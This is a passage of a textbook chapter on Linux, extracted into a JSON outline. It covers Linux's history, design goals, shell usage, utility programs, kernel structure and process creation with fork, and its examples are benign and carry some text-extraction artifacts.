            "page": 751,
            "content": "10.1.7 Linux\r\nDuring the early years of MINIX development and discussion on the Internet,\r\nmany people requested (or in many cases, demanded) more and better features, to\r\nwhich the author often said ‘‘No’’ (to keep the system small enough for students to\r\nunderstand completely in a one-semester university course). This continuous\r\n‘‘No’’ irked many users. At this time, FreeBSD was not available, so that was not\r\nan option. After a number of years went by like this, a Finnish student, Linus Tor\u0002valds, decided to write another UNIX clone, named Linux, which would be a full\u0002blown production system with many features MINIX was initially lacking. The\r\nfirst version of Linux, 0.01, was released in 1991. It was cross-developed on a\r\nMINIX machine and borrowed numerous ideas from MINIX, ranging from the\r\nstructure of the source tree to the layout of the file system. However, it was a\r\nmonolithic rather than a microkernel design, with the entire operating system in the\r\nkernel. The code totaled 9300 lines of C and 950 lines of assembler, roughly simi\u0002lar to MINIX version in size and also comparable in functionality. De facto, it was\r\na rewrite of MINIX, the only system Torvalds had source code for.\nSEC. 10.1 HISTORY OF UNIX AND LINUX 721\r\nLinux rapidly grew in size and evolved into a full, production UNIX clone, as\r\nvirtual memory, a more sophisticated file system, and many other features were\r\nadded. Although it originally ran only on the 386 (and even had embedded 386 as\u0002sembly code in the middle of C procedures), it was quickly ported to other plat\u0002forms and now runs on a wide variety of machines, just as UNIX does. One dif\u0002ference with UNIX does stand out, however: Linux makes use of so many special\r\nfeatures of the gcc compiler and would need a lot of work before it would compile\r\nwith an ANSI standard C compiler. The shortsighted idea that gcc is the only com\u0002piler the world will ever see is already becoming a problem because the open\u0002source LLVM compiler from the University of Illinois is rapidly gaining many\r\nadherents due to its flexibility and code quality. Since LLVM does not support all\r\nthe nonstandard gcc extensions to C, it cannot compile the Linux kernel without a\r\nlot of patches to the kernel to replace non-ANSI code.\r\nThe next major release of Linux was version 1.0, issued in 1994. It was about\r\n165,000 lines of code and included a new file system, memory-mapped files, and\r\nBSD-compatible networking with sockets and TCP/IP. It also included many new\r\ndevice drivers. Several minor revisions followed in the next two years.\r\nBy this time, Linux was sufficiently compatible with UNIX that a vast amount\r\nof UNIX software was ported to Linux, making it far more useful than it would\r\nhave otherwise been. In addition, a large number of people were attracted to Linux\r\nand began working on the code and extending it in many ways under Torvalds’\r\ngeneral supervision.\r\nThe next major release, 2.0, was made in 1996. It consisted of about 470,000\r\nlines of C and 8000 lines of assembly code. It included support for 64-bit architec\u0002tures, symmetric multiprogramming, new networking protocols, and numerous\r\nother features. A large fraction of the total code mass was taken up by an extensive\r\ncollection of device drivers for an ever-growing set of supported peripherals. Addi\u0002tional releases followed frequently.\r\nThe version numbers of the Linux kernel consist of four numbers, A.B.C.D,\r\nsuch as 2.6.9.11. The first number denotes the kernel version. The second number\r\ndenotes the major revision. Prior to the 2.6 kernel, even revision numbers corre\u0002sponded to stable kernel releases, whereas odd ones corresponded to unstable revi\u0002sions, under development. With the 2.6 kernel that is no longer the case. The third\r\nnumber corresponds to minor revisions, such as support for new drivers. The fourth\r\nnumber corresponds to minor bug fixes or security patches. In July 2011 Linus\r\nTorvalds announced the release of Linux 3.0, not in response to major technical ad\u0002vances, but rather in honor of the 20th anniversary of the kernel. As of 2013, the\r\nLinux kernel consists of close to 16 million lines of code.\r\nA large array of standard UNIX software has been ported to Linux, including\r\nthe popular X Window System and a great deal of networking software. Two dif\u0002ferent GUIs (GNOME and KDE), which compete with each other, hav e also been\r\nwritten for Linux. In short, it has grown to a full-blown UNIX clone with all the\r\nbells and whistles a UNIX lover might conceivably want.\n722 CASE STUDY 1: UNIX, LINUX, AND ANDROID CHAP. 10\r\nOne unusual feature of Linux is its business model: it is free software. It can\r\nbe downloaded from various sites on the Internet, for example: www.kernel.org.\r\nLinux comes with a license devised by Richard Stallman, founder of the Free Soft\u0002ware Foundation. Despite the fact that Linux is free, this license, the GPL (GNU\r\nPublic License), is longer than Microsoft’s Windows license and specifies what\r\nyou can and cannot do with the code. Users may use, copy, modify, and redis\u0002tribute the source and binary code freely. The main restriction is that all works\r\nderived from the Linux kernel may not be sold or redistributed in binary form only;\r\nthe source code must either be shipped with the product or be made available on\r\nrequest.\r\nAlthough Torvalds still rides herd on the kernel fairly closely, a large amount\r\nof user-level software has been written by numerous other programmers, many of\r\nthem having migrated over from the MINIX, BSD, and GNU online communities.\r\nHowever, as Linux evolves, an increasingly smaller fraction of the Linux commun\u0002ity wants to hack source code (witness the hundreds of books telling how to install\r\nand use Linux and only a handful discussing the code or how it works). Also,\r\nmany Linux users now forgo the free distribution on the Internet to buy one of the\r\nmany CD-ROM distributions available from numerous competing commercial\r\ncompanies. A popular Website listing the current top-100 Linux distributions is at\r\nwww.distrowatch.org. As more and more software companies start selling their\r\nown versions of Linux and more and more hardware companies offer to preinstall\r\nit on the computers they ship, the line between commercial software and free soft\u0002ware is beginning to blur substantially.\r\nAs a footnote to the Linux story, it is interesting to note that just as the Linux\r\nbandwagon was gaining steam, it got a big boost from a very unexpected source—\r\nAT&T. In 1992, Berkeley, by now running out of funding, decided to terminate\r\nBSD development with one final release, 4.4BSD (which later formed the basis of\r\nFreeBSD). Since this version contained essentially no AT&T code, Berkeley\r\nissued the software under an open source license (not GPL) that let everybody do\r\nwhatever they wanted with it except one thing—sue the University of California.\r\nThe AT&T subsidiary controlling UNIX promptly reacted by—you guessed it—\r\nsuing the University of California. It also sued a company, BSDI, set up by the\r\nBSD developers to package the system and sell support, much as Red Hat and\r\nother companies now do for Linux. Since virtually no AT&T code was involved,\r\nthe lawsuit was based on copyright and trademark infringement, including items\r\nsuch as BSDI’s 1-800-ITS-UNIX telephone number. Although the case was even\u0002tually settled out of court, it kept FreeBSD off the market long enough for Linux to\r\nget well established. Had the lawsuit not happened, starting around 1993 there\r\nwould have been serious competition between two free, open source UNIX sys\u0002tems: the reigning champion, BSD, a mature and stable system with a large aca\u0002demic following dating back to 1977, versus the vigorous young challenger, Linux,\r\njust two years old but with a growing following among individual users. Who\r\nknows how this battle of the free UNICES would have turned out?\nSEC."
          }
        }
      },
      "10.2 OVERVIEW OF LINUX": {
        "page": 754,
        "children": {
          "10.2.1 Linux Goals": {
            "page": 754,
            "content": "10.2.1 Linux Goals\r\nUNIX was always an interactive system designed to handle multiple processes\r\nand multiple users at the same time. It was designed by programmers, for pro\u0002grammers, to use in an environment in which the majority of the users are rel\u0002atively sophisticated and are engaged in (often quite complex) software develop\u0002ment projects. In many cases, a large number of programmers are actively cooper\u0002ating to produce a single system, so UNIX has extensive facilities to allow people\r\nto work together and share information in controlled ways. The model of a group\r\nof experienced programmers working together closely to produce advanced soft\u0002ware is obviously very different from the personal-computer model of a single\r\nbeginner working alone with a word processor, and this difference is reflected\r\nthroughout UNIX from start to finish. It is only natural that Linux inherited many\r\nof these goals, even though the first version was for a personal computer.\r\nWhat is it that good programmers really want in a system? To start with, most\r\nlike their systems to be simple, elegant, and consistent. For example, at the lowest\r\nlevel, a file should just be a collection of bytes. Having different classes of files for\r\nsequential access, random access, keyed access, remote access, and so on (as main\u0002frames do) just gets in the way. Similarly, if the command\r\nls A* means list all the files beginning with ‘‘A’’, then the command\r\nrm A* should mean remove all the files beginning with ‘‘A’’ and not remove the one file\r\nwhose name consists of an ‘‘A’’ and an asterisk. This characteristic is sometimes\r\ncalled the principle of least surprise.\r\nAnother thing that experienced programmers generally want is power and flex\u0002ibility. This means that a system should have a small number of basic elements that\r\ncan be combined in an infinite variety of ways to suit the application. One of the\r\nbasic guidelines behind Linux is that every program should do just one thing and\r\ndo it well. Thus compilers do not produce listings, because other programs can do\r\nthat better.\r\nFinally, most programmers have a strong dislike for useless redundancy. Why\r\ntype copy when cp is clearly enough to make it abundantly clear what you want? It\n724 CASE STUDY 1: UNIX, LINUX, AND ANDROID CHAP. 10\r\nis a complete waste of valuable hacking time. To extract all the lines containing\r\nthe string ‘‘ard’’ from the file f, the Linux programmer merely types\r\ngrep ard f\r\nThe opposite approach is to have the programmer first select the grep program\r\n(with no arguments), and then have grep announce itself by saying: ‘‘Hi, I’m grep,\r\nI look for patterns in files. Please enter your pattern.’’ After getting the pattern,\r\ngrep prompts for a file name. Then it asks if there are any more file names. Final\u0002ly, it summarizes what it is going to do and asks if that is correct. While this kind\r\nof user interface may be suitable for rank novices, it drives skilled programmers up\r\nthe wall. What they want is a servant, not a nanny."
          },
          "10.2.2 Interfaces to Linux": {
            "page": 755,
            "content": "10.2.2 Interfaces to Linux\r\nA Linux system can be regarded as a kind of pyramid, as illustrated in\r\nFig. 10-1. At the bottom is the hardware, consisting of the CPU, memory, disks, a\r\nmonitor and keyboard, and other devices. Running on the bare hardware is the op\u0002erating system. Its function is to control the hardware and provide a system call in\u0002terface to all the programs. These system calls allow user programs to create and\r\nmanage processes, files, and other resources.\r\nUsers\r\nStandard utility programs\r\n(shell, editors, compliers etc)\r\nStandard library\r\n(open, close, read, write, fork, etc)\r\nLinux operating system\r\n(process management, memory management,\r\nthe file system, I/O, etc)\r\nHardware\r\n(CPU, memory, disks, terminals, etc)\r\nUser\r\ninterface\r\nLibrary\r\ninterface\r\nSystem\r\ncall\r\ninterface\r\nUser\r\nmode\r\nKernel mode\r\nFigure 10-1. The layers in a Linux system.\r\nPrograms make system calls by putting the arguments in registers (or some\u0002times, on the stack), and issuing trap instructions to switch from user mode to ker\u0002nel mode. Since there is no way to write a trap instruction in C, a library is pro\u0002vided, with one procedure per system call. These procedures are written in assem\u0002bly language but can be called from C. Each one first puts its arguments in the\nSEC. 10.2 OVERVIEW OF LINUX 725\r\nproper place, then executes the trap instruction. Thus to execute the read system\r\ncall, a C program can call the read library procedure. As an aside, it is the library\r\ninterface, and not the system call interface, that is specified by POSIX. In other\r\nwords, POSIX tells which library procedures a conformant system must supply,\r\nwhat their parameters are, what they must do, and what results they must return. It\r\ndoes not even mention the actual system calls.\r\nIn addition to the operating system and system call library, all versions of\r\nLinux supply a large number of standard programs, some of which are specified by\r\nthe POSIX 1003.2 standard, and some of which differ between Linux versions.\r\nThese include the command processor (shell), compilers, editors, text-processing\r\nprograms, and file-manipulation utilities. It is these programs that a user at the\r\nkeyboard invokes. Thus, we can speak of three different interfaces to Linux: the\r\ntrue system call interface, the library interface, and the interface formed by the set\r\nof standard utility programs.\r\nMost of the common personal computer distributions of Linux have replaced\r\nthis keyboard-oriented user interface with a mouse-oriented graphical user inter\u0002face, without changing the operating system itself at all. It is precisely this flexi\u0002bility that makes Linux so popular and has allowed it to survive numerous changes\r\nin the underlying technology so well.\r\nThe GUI for Linux is similar to the first GUIs developed for UNIX systems in\r\nthe 1970s, and popularized by Macintosh and later Windows for PC platforms. The\r\nGUI creates a desktop environment, a familiar metaphor with windows, icons,\r\nfolders, toolbars, and drag-and-drop capabilities. A full desktop environment con\u0002tains a window manager, which controls the placement and appearance of win\u0002dows, as well as various applications, and provides a consistent graphical interface.\r\nPopular desktop environments for Linux include GNOME (GNU Network Object\r\nModel Environment) and KDE (K Desktop Environment).\r\nGUIs on Linux are supported by the X Windowing System, or commonly X11\r\nor just X, which defines communication and display protocols for manipulating\r\nwindows on bitmap displays for UNIX and UNIX-like systems. The X server is the\r\nmain component which controls devices such as the keyboard, mouse, and screen\r\nand is responsible for redirecting input to or accepting output from client pro\u0002grams. The actual GUI environment is typically built on top of a low-level library,\r\nxlib, which contains the functionality to interact with the X server. The graphical\r\ninterface extends the basic functionality of X11 by enriching the window view,\r\nproviding buttons, menus, icons, and other options. The X server can be started\r\nmanually, from a command line, but is typically started during the boot process by\r\na display manager, which displays the graphical login screen for the user.\r\nWhen working on Linux systems through a graphical interface, users may use\r\nmouse clicks to run applications or open files, drag and drop to copy files from one\r\nlocation to another, and so on. In addition, users may invoke a terminal emulator\r\nprogram, or xterm, which provides them with the basic command-line interface to\r\nthe operating system. Its description is given in the following section.\n726 CASE STUDY 1: UNIX, LINUX, AND ANDROID CHAP. 10"
          },
          "10.2.3 The Shell": {
            "page": 757,
            "content": "10.2.3 The Shell\r\nAlthough Linux systems have a graphical user interface, most programmers\r\nand sophisticated users still prefer a command-line interface, called the shell.\r\nOften they start one or more shell windows from the graphical user interface and\r\njust work in them. The shell command-line interface is much faster to use, more\r\npowerful, easily extensible, and does not give the user RSI from having to use a\r\nmouse all the time. Below we will briefly describe the bash shell (bash). It is\r\nheavily based on the original UNIX shell, Bourne shell (written by Steve Bourne,\r\nthen at Bell Labs). Its name is an acronym for Bourne Again SHell. Many other\r\nshells are also in use (ksh, csh, etc.), but bash is the default shell in most Linux\r\nsystems.\r\nWhen the shell starts up, it initializes itself, then types a prompt character,\r\noften a percent or dollar sign, on the screen and waits for the user to type a com\u0002mand line.\r\nWhen the user types a command line, the shell extracts the first word from it,\r\nwhere word here means a run of characters delimited by a space or tab. It then as\u0002sumes this word is the name of a program to be run, searches for this program, and\r\nif it finds it, runs the program. The shell then suspends itself until the program ter\u0002minates, at which time it tries to read the next command. What is important here is\r\nsimply the observation that the shell is an ordinary user program. All it needs is the\r\nability to read from the keyboard and write to the monitor and the power to execute\r\nother programs.\r\nCommands may take arguments, which are passed to the called program as\r\ncharacter strings. For example, the command line\r\ncp src dest\r\ninvokes the cp program with two arguments, src and dest. This program interprets\r\nthe first one to be the name of an existing file. It makes a copy of this file and calls\r\nthe copy dest.\r\nNot all arguments are file names. In\r\nhead –20 file\r\nthe first argument, –20, tells head to print the first 20 lines of file, instead of the de\u0002fault number of lines, 10. Arguments that control the operation of a command or\r\nspecify an optional value are called flags, and by convention are indicated with a\r\ndash. The dash is required to avoid ambiguity, because the command\r\nhead 20 file\r\nis perfectly legal, and tells head to first print the initial 10 lines of a file called 20,\r\nand then print the initial 10 lines of a second file called file. Most Linux com\u0002mands accept multiple flags and arguments.\nSEC. 10.2 OVERVIEW OF LINUX 727\r\nTo make it easy to specify multiple file names, the shell accepts magic charac\u0002ters, sometimes called wild cards. An asterisk, for example, matches all possible\r\nstrings, so\r\nls *.c\r\ntells ls to list all the files whose name ends in .c. If files named x.c, y.c, and z.c all\r\nexist, the above command is equivalent to typing\r\nls x.c y.c z.c\r\nAnother wild card is the question mark, which matches any one character. A list of\r\ncharacters inside square brackets selects any of them, so\r\nls [ape]*\r\nlists all files beginning with ‘‘a’’, ‘‘p’’, or ‘‘e’’.\r\nA program like the shell does not have to open the terminal (keyboard and\r\nmonitor) in order to read from it or write to it. Instead, when it (or any other pro\u0002gram) starts up, it automatically has access to a file called standard input (for\r\nreading), a file called standard output (for writing normal output), and a file cal\u0002led standard error (for writing error messages). Normally, all three default to the\r\nterminal, so that reads from standard input come from the keyboard and writes to\r\nstandard output or standard error go to the screen. Many Linux programs read from\r\nstandard input and write to standard output as the default. For example,\r\nsor t\r\ninvokes the sort program, which reads lines from the terminal (until the user types\r\na CTRL-D, to indicate end of file), sorts them alphabetically, and writes the result\r\nto the screen.\r\nIt is also possible to redirect standard input and standard output, as that is often\r\nuseful. The syntax for redirecting standard input uses a less-than symbol (<) fol\u0002lowed by the input file name. Similarly, standard output is redirected using a great\u0002er-than symbol (>). It is permitted to redirect both in the same command. For ex\u0002ample, the command\r\nsor t <in >out\r\ncauses sort to take its input from the file in and write its output to the file out.\r\nSince standard error has not been redirected, any error messages go to the screen.\r\nA program that reads its input from standard input, does some processing on it, and\r\nwrites its output to standard output is called a filter.\r\nConsider the following command line consisting of three separate commands:\r\nsor t <in >temp; head –30 <temp; rm temp\r\nIt first runs sort, taking the input from in and writing the output to temp. When\r\nthat has been completed, the shell runs head, telling it to print the first 30 lines of\n728 CASE STUDY 1: UNIX, LINUX, AND ANDROID CHAP. 10\r\ntemp and print them on standard output, which defaults to the terminal. Finally, the\r\ntemporary file is removed. It is not recycled. It is gone with the wind, forever.\r\nIt frequently occurs that the first program in a command line produces output\r\nthat is used as input to the next program. In the above example, we used the file\r\ntemp to hold this output. However, Linux provides a simpler construction to do the\r\nsame thing. In\r\nsor t <in | head –30\r\nthe vertical bar, called the pipe symbol, says to take the output from sort and use it\r\nas the input to head, eliminating the need for creating, using, and removing the\r\ntemporary file. A collection of commands connected by pipe symbols, called a\r\npipeline, may contain arbitrarily many commands. A four-component pipeline is\r\nshown by the following example:\r\ngrep ter *.t | sort | head –20 | tail –5 >foo\r\nHere all the lines containing the string ‘‘ter’’ in all the files ending in .t are written\r\nto standard output, where they are sorted. The first 20 of these are selected out by\r\nhead, which passes them to tail, which writes the last fiv e (i.e., lines 16 to 20 in the\r\nsorted list) to foo. This is an example of how Linux provides basic building blocks\r\n(numerous filters), each of which does one job, along with a mechanism for them\r\nto be put together in almost limitless ways.\r\nLinux is a general-purpose multiprogramming system. A single user can run\r\nseveral programs at once, each as a separate process. The shell syntax for running\r\na process in the background is to follow its command with an ampersand. Thus\r\nwc –l <a >b &\r\nruns the word-count program, wc, to count the number of lines (–l flag) in its input,\r\na, writing the result to b, but does it in the background. As soon as the command\r\nhas been typed, the shell types the prompt and is ready to accept and handle the\r\nnext command. Pipelines can also be put in the background, for example, by\r\nsor t <x | head &\r\nMultiple pipelines can run in the background simultaneously.\r\nIt is possible to put a list of shell commands in a file and then start a shell with\r\nthis file as standard input. The (second) shell just processes them in order, the same\r\nas it would with commands typed on the keyboard. Files containing shell com\u0002mands are called shell scripts. Shell scripts may assign values to shell variables\r\nand then read them later. They may also have parameters, and use if, for, while, and\r\ncase constructs. Thus a shell script is really a program written in shell language.\r\nThe Berkeley C shell is an alternative shell designed to make shell scripts (and the\r\ncommand language in general) look like C programs in many respects. Since the\r\nshell is just another user program, other people have written and distributed a va\u0002riety of other shells. Users are free to choose whatever shells they like.\nSEC. 10.2 OVERVIEW OF LINUX 729"
          },
          "10.2.4 Linux Utility Programs": {
            "page": 760,
            "content": "10.2.4 Linux Utility Programs\r\nThe command-line (shell) user interface to Linux consists of a large number of\r\nstandard utility programs. Roughly speaking, these programs can be divided into\r\nsix categories, as follows:\r\n1. File and directory manipulation commands.\r\n2. Filters.\r\n3. Program development tools, such as editors and compilers.\r\n4. Text processing.\r\n5. System administration.\r\n6. Miscellaneous.\r\nThe POSIX 1003.1-2008 standard specifies the syntax and semantics of about 150\r\nof these, primarily in the first three categories. The idea of standardizing them is to\r\nmake it possible for anyone to write shell scripts that use these programs and work\r\non all Linux systems.\r\nIn addition to these standard utilities, there are many application programs as\r\nwell, of course, such as Web browsers, media players, image viewers, office suites,\r\ngames, and so on.\r\nLet us consider some examples of these programs, starting with file and direc\u0002tory manipulation.\r\ncp a b\r\ncopies file a to b, leaving the original file intact. In contrast,\r\nmv a b\r\ncopies a to b but removes the original. In effect, it moves the file rather than really\r\nmaking a copy in the usual sense. Several files can be concatenated using cat,\r\nwhich reads each of its input files and copies them all to standard output, one after\r\nanother. Files can be removed by the rm command. The chmod command allows\r\nthe owner to change the rights bits to modify access permissions. Directories can\r\nbe created with mkdir and removed with rmdir. To see a list of the files in a direc\u0002tory, ls can be used. It has a vast number of flags to control how much detail about\r\neach file is shown (e.g., size, owner, group, creation date), to determine the sort\r\norder (e.g., alphabetical, by time of last modification, reversed), to specify the lay\u0002out on the screen, and much more.\r\nWe hav e already seen several filters: grep extracts lines containing a given pat\u0002tern from standard input or one or more input files; sort sorts its input and writes it\r\non standard output; head extracts the initial lines of its input; tail extracts the final\r\nlines of its input. Other filters defined by 1003.2 are cut and paste, which allow\n730 CASE STUDY 1: UNIX, LINUX, AND ANDROID CHAP. 10\r\ncolumns of text to be cut and pasted into files; od, which converts its (usually bina\u0002ry) input to ASCII text, in octal, decimal, or hexadecimal; tr, which does character\r\ntranslation (e.g., lowercase to uppercase), and pr, which formats output for the\r\nprinter, including options to include running heads, page numbers, and so on.\r\nCompilers and programming tools include gcc, which calls the C compiler, and\r\nar, which collects library procedures into archive files.\r\nAnother important tool is make, which is used to maintain large programs\r\nwhose source code consists of multiple files. Typically, some of these are header\r\nfiles, which contain type, variable, macro, and other declarations. Source files often\r\ninclude these using a special include directive. This way, two or more source files\r\ncan share the same declarations. However, if a header file is modified, it is neces\u0002sary to find all the source files that depend on it and recompile them. The function\r\nof make is to keep track of which file depends on which header, and similar things,\r\nand arrange for all the necessary compilations to occur automatically. Nearly all\r\nLinux programs, except the smallest ones, are set up to be compiled with make.\r\nA selection of the POSIX utility programs is listed in Fig. 10-2, along with a\r\nshort description of each. All Linux systems have them and many more.\r\nProgram Typical use\r\ncat Concatenate multiple files to standard output\r\nchmod Change file protection mode\r\ncp Copy one or more files\r\ncut Cut columns of text from a file\r\ngrep Search a file for some pattern\r\nhead Extract the first lines of a file\r\nls List director y\r\nmake Compile files to build a binary\r\nmkdir Make a director y\r\nod Octal dump a file\r\npaste Paste columns of text into a file\r\npr For mat a file for printing\r\nps List running processes\r\nrm Remove one or more files\r\nrmdir Remove a director y\r\nsor t Sor t a file of lines alphabetically\r\ntail Extract the last lines of a file\r\ntr Translate between character sets\r\nFigure 10-2. A few of the common Linux utility programs required by POSIX.\nSEC. 10.2 OVERVIEW OF LINUX 731"
          },
          "10.2.5 Kernel Structure": {
            "page": 762,
            "content": "10.2.5 Kernel Structure\r\nIn Fig. 10-1 we saw the overall structure of a Linux system. Now let us zoom\r\nin and look more closely at the kernel as a whole before examining the various\r\nparts, such as process scheduling and the file system.\r\nSystem calls\r\nInterrupts Dispatcher\r\nVirtual file system\r\nTerminals Sockets File\r\nsystems\r\nNetwork\r\nprotocols\r\nNetwork\r\ndevice\r\ndrivers\r\nBlock\r\ndevice\r\ndrivers\r\nCharacter\r\ndevice\r\ndrivers\r\nI/O scheduler\r\nGeneric\r\nblock layer\r\nLine\r\ndiscipline\r\nPage\r\ncache\r\nPaging\r\npage\r\nreplacement\r\nVirtual\r\nmemory\r\nSignal\r\nhandling\r\nProcess/thread\r\ncreation &\r\ntermination\r\nCPU\r\nscheduling\r\nI/O component\r\nMemory mgt \r\ncomponent\r\nProcess mgt\r\ncomponent\r\nFigure 10-3. Structure of the Linux kernel\r\nThe kernel sits directly on the hardware and enables interactions with I/O de\u0002vices and the memory management unit and controls CPU access to them. At the\r\nlowest level, as shown in Fig. 10-3 it contains interrupt handlers, which are the pri\u0002mary way for interacting with devices, and the low-level dispatching mechanism.\r\nThis dispatching occurs when an interrupt happens. The low-level code here stops\r\nthe running process, saves its state in the kernel process structures, and starts the\r\nappropriate driver. Process dispatching also happens when the kernel completes\r\nsome operations and it is time to start up a user process again. The dispatching\r\ncode is in assembler and is quite distinct from scheduling.\r\nNext, we divide the various kernel subsystems into three main components.\r\nThe I/O component in Fig. 10-3 contains all kernel pieces responsible for interact\u0002ing with devices and performing network and storage I/O operations. At the high\u0002est level, the I/O operations are all integrated under a VFS (Virtual File System)\r\nlayer. That is, at the top level, performing a read operation on a file, whether it is in\n732 CASE STUDY 1: UNIX, LINUX, AND ANDROID CHAP. 10\r\nmemory or on disk, is the same as performing a read operation to retrieve a charac\u0002ter from a terminal input. At the lowest level, all I/O operations pass through some\r\ndevice driver. All Linux drivers are classified as either character-device drivers or\r\nblock-device drivers, the main difference being that seeks and random accesses are\r\nallowed on block devices and not on character devices. Technically, network de\u0002vices are really character devices, but they are handled somewhat differently, so\r\nthat it is probably clearer to separate them, as has been done in the figure.\r\nAbove the device-driver lev el, the kernel code is different for each device type.\r\nCharacter devices may be used in two different ways. Some programs, such as\r\nvisual editors like vi and emacs, want every keystroke as it is hit. Raw terminal\r\n(tty) I/O makes this possible. Other software, such as the shell, is line oriented, al\u0002lowing users to edit the whole line before hitting ENTER to send it to the program.\r\nIn this case the character stream from the terminal device is passed through a so\u0002called line discipline, and appropriate formatting is applied.\r\nNetworking software is often modular, with different devices and protocols\r\nsupported. The layer above the network drivers handles a kind of routing function,\r\nmaking sure that the right packet goes to the right device or protocol handler. Most\r\nLinux systems contain the full functionality of a hardware router within the kernel,\r\nalthough the performance is less than that of a hardware router. Above the router\r\ncode is the actual protocol stack, including IP and TCP, but also many additional\r\nprotocols. Overlaying all the network is the socket interface, which allows pro\u0002grams to create sockets for particular networks and protocols, getting back a file\r\ndescriptor for each socket to use later.\r\nOn top of the disk drivers is the I/O scheduler, which is responsible for order\u0002ing and issuing disk-operation requests in a way that tries to conserve wasteful disk\r\nhead movement or to meet some other system policy.\r\nAt the very top of the block-device column are the file systems. Linux may,\r\nand in fact does, have multiple file systems coexisting concurrently. In order to\r\nhide the gruesome architectural differences of various hardware devices from the\r\nfile system implementation, a generic block-device layer provides an abstraction\r\nused by all file systems.\r\nTo the right in Fig. 10-3 are the other two key components of the Linux kernel.\r\nThese are responsible for the memory and process management tasks. Memo\u0002ry-management tasks include maintaining the virtual to physical-memory map\u0002pings, maintaining a cache of recently accessed pages and implementing a good\r\npage-replacement policy, and on-demand bringing in new pages of needed code\r\nand data into memory.\r\nThe key responsibility of the process-management component is the creation\r\nand termination of processes. It also includes the process scheduler, which chooses\r\nwhich process or, rather, thread to run next. As we shall see in the next section, the\r\nLinux kernel treats both processes and threads simply as executable entities, and\r\nwill schedule them based on a global scheduling policy. Finally, code for signal\r\nhandling also belongs to this component.\nSEC. 10.2 OVERVIEW OF LINUX 733\r\nWhile the three components are represented separately in the figure, they are\r\nhighly interdependent. File systems typically access files through the block de\u0002vices. However, in order to hide the large latencies of disk accesses, files are cop\u0002ied into the page cache in main memory. Some files may even be dynamically\r\ncreated and may have only an in-memory representation, such as files providing\r\nsome run-time resource usage information. In addition, the virtual memory system\r\nmay rely on a disk partition or in-file swap area to back up parts of the main mem\u0002ory when it needs to free up certain pages, and therefore relies on the I/O compo\u0002nent. Numerous other interdependencies exist.\r\nIn addition to the static in-kernel components, Linux supports dynamically\r\nloadable modules. These modules can be used to add or replace the default device\r\ndrivers, file system, networking, or other kernel codes. The modules are not shown\r\nin Fig. 10-3.\r\nFinally, at the very top is the system call interface into the kernel. All system\r\ncalls come here, causing a trap which switches the execution from user mode into\r\nprotected kernel mode and passes control to one of the kernel components de\u0002scribed above."
          }
        }
      },
      "10.3 PROCESSES IN LINUX": {
        "page": 764,
        "children": {
          "10.3.1 Fundamental Concepts": {
            "page": 764,
            "content": "10.3.1 Fundamental Concepts\r\nThe main active entities in a Linux system are the processes. Linux processes\r\nare very similar to the classical sequential processes that we studied in Chap 2.\r\nEach process runs a single program and initially has a single thread of control. In\r\nother words, it has one program counter, which keeps track of the next instruction\r\nto be executed. Linux allows a process to create additional threads once it starts.\n734 CASE STUDY 1: UNIX, LINUX, AND ANDROID CHAP. 10\r\nLinux is a multiprogramming system, so multiple, independent processes may\r\nbe running at the same time. Furthermore, each user may have sev eral active proc\u0002esses at once, so on a large system, there may be hundreds or even thousands of\r\nprocesses running. In fact, on most single-user workstations, even when the user is\r\nabsent, dozens of background processes, called daemons, are running. These are\r\nstarted by a shell script when the system is booted. (‘‘Daemon’’ is a variant\r\nspelling of ‘‘demon,’’ which is a self-employed evil spirit.)\r\nA typical daemon is the cron daemon. It wakes up once a minute to check if\r\nthere is any work for it to do. If so, it does the work. Then it goes back to sleep\r\nuntil it is time for the next check.\r\nThis daemon is needed because it is possible in Linux to schedule activities\r\nminutes, hours, days, or even months in the future. For example, suppose a user\r\nhas a dentist appointment at 3 o’clock next Tuesday. He can make an entry in the\r\ncron daemon’s database telling the daemon to beep at him at, say, 2:30. When the\r\nappointed day and time arrives, the cron daemon sees that it has work to do, and\r\nstarts up the beeping program as a new process.\r\nThe cron daemon is also used to start up periodic activities, such as making\r\ndaily disk backups at 4 A.M., or reminding forgetful users every year on October 31\r\nto stock up on trick-or-treat goodies for Halloween. Other daemons handle incom\u0002ing and outgoing electronic mail, manage the line printer queue, check if there are\r\nenough free pages in memory, and so forth. Daemons are straightforward to imple\u0002ment in Linux because each one is a separate process, independent of all other\r\nprocesses.\r\nProcesses are created in Linux in an especially simple manner. The fork system\r\ncall creates an exact copy of the original process. The forking process is called the\r\nparent process. The new process is called the child process. The parent and\r\nchild each have their own, private memory images. If the parent subsequently\r\nchanges any of its variables, the changes are not visible to the child, and vice versa.\r\nOpen files are shared between parent and child. That is, if a certain file was\r\nopen in the parent before the fork, it will continue to be open in both the parent and\r\nthe child afterward. Changes made to the file by either one will be visible to the\r\nother. This behavior is only reasonable, because these changes are also visible to\r\nany unrelated process that opens the file.\r\nThe fact that the memory images, variables, registers, and everything else are\r\nidentical in the parent and child leads to a small difficulty: How do the processes\r\nknow which one should run the parent code and which one should run the child\r\ncode? The secret is that the fork system call returns a 0 to the child and a nonzero\r\nvalue, the child’s PID (Process Identifier), to the parent. Both processes normally\r\ncheck the return value and act accordingly, as shown in Fig. 10-4.\r\nProcesses are named by their PIDs. When a process is created, the parent is\r\ngiven the child’s PID, as mentioned above. If the child wants to know its own PID,\r\nthere is a system call, getpid, that provides it. PIDs are used in a variety of ways.\r\nFor example, when a child terminates, the parent is given the PID of the child that\nSEC. 10.3 PROCESSES IN LINUX 735\r\npid = for k( ); /* if the for k succeeds, pid > 0 in the parent */\r\nif (pid < 0) {\r\nhandle error( ); /* fork failed (e.g., memory or some table is full) */\r\n} else if (pid > 0) {\r\n/\r\n* parent code goes here. /*/\r\n} else {\r\n/\r\n* child code goes here. /*/\r\n}\r\nFigure 10-4. Process creation in Linux.\r\njust finished. This can be important because a parent may have many children.\r\nSince children may also have children, an original process can build up an entire\r\ntree of children, grandchildren, and further descendants.\r\nProcesses in Linux can communicate with each other using a form of message\r\npassing. It is possible to create a channel between two processes into which one\r\nprocess can write a stream of bytes for the other to read. These channels are called\r\npipes. Synchronization is possible because when a process tries to read from an\r\nempty pipe it is blocked until data are available.\r\nShell pipelines are implemented with pipes. When the shell sees a line like\r\nsor t <f | head\r\nit creates two processes, sort and head, and sets up a pipe between them in such a\r\nway that sort’s standard output is connected to head’s standard input. In this way,\r\nall the data that sort writes go directly to head, instead of going to a file. If the\r\npipe fills, the system stops running sort until head has removed some data from it.\r\nProcesses can also communicate in another way besides pipes: software inter\u0002rupts. A process can send what is called a signal to another process. Processes can\r\ntell the system what they want to happen when an incoming signal arrives. 